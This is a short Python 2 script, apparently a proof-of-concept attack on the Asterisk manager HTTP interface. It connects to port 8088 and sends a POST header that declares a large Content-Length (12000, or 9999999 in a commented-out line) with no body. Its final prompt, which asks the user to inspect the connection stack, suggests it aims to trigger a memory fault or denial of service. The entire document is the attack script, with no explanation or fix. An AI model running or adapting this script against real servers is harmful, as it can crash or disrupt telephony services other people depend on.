#!/usr/bin/python
import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
raw_input("Press Enter to connect.. ")
s.connect( ("localhost", 8088) )

raw_input("Press Enter to send header.. ")
h1 = "POST /asterisk/manager HTTP/1.0\r\n"
h2 = "Host: localhost\r\n"
h3 = "Content-length: "+str(12000)+"\r\n"
#h3 = "Content-length: 9999999\r\n"
h4 = "\r\n"
s.send(h1+h2+h3+h4)

raw_input("Press Enter to close connection..")
s.close()

raw_input("Press Enter to quit look at 2nd connection stack..")
